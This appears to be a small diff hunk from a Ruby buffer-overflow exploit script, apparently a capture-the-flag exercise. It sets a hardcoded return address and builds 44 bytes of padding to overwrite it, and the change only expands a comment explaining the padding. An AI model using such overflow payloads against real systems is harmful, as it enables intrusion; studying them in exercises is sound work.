@@ -8,7 +8,7 @@ port = PORT
 return_addr = "\xcd\x88\x04\x08"
 
 # follwing is the buffer to do leaking
-# fill total 44 char
+# fill total 44 char, its to fill the space between s[0] and return_addr
 buf = ''
 44.times { buf << 'a' }
 # fill the return address
